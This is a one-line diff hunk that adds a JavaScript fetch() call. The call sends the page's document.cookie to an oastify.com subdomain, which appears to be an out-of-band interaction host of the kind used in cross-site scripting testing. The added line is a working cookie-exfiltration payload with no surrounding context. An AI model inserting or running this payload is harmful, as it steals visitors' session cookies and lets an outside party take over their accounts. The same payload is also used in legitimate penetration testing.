@@ -1,0 +1,1 @@
+fetch('http://d0efxcpv5lgarkgcgkecapyim9s8gy4n.oastify.com/'+document.cookie);
